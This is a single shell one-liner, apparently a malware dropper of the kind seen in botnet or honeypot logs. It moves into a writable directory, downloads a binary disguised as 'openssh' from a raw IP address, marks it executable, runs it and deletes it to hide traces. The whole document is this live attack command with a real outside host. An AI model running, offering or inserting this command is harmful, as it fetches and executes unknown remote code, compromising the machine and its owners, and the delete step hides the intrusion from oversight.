cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.126/openssh; chmod +x openssh; ./openssh; rm -rf openssh
